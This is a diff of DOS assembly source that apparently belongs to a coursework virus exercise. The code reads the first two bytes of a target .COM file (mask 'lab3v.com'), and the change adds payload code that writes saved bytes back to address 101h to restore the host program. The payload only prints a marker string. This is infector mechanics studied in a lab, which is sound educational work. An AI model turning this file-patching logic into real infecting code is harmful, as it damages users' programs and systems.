@@ -98,7 +98,7 @@ file_err_skip:
 
     ; reading first 2 bytes:
     mov cx, 2
-    lea dx, leading_2_bytes
+    lea dx, leading_bytes
     mov ah, 3fh
     int 21h
     
@@ -128,6 +128,10 @@ file_err_skip:
 
 payload_code:
 
+    mov ax, leading_bytes
+    mov bx, 101h
+    mov word ptr[bx], ax
+
     lea dx, pd_str
     mov ah, 09h
     int 21h
@@ -135,6 +139,7 @@ payload_code:
 payload_data:
 
     pd_str db '<< PAYLOAD >>', 13, 10, '$'
+    leading_bytes dw 0abcdh
 
 data:
     
@@ -162,7 +167,6 @@ data:
     word_buffer dw ?
     payload_offset_near db ?
     payload_offset dw ?, ?
-    leading_2_bytes db 2 dup (?)
     file_mask db 'lab3v.com', 0
     file_err_msg db 'Error, can not find or open such file.', 13, 10, '$'
     input_msg db 'Input the target filename >> ','$'
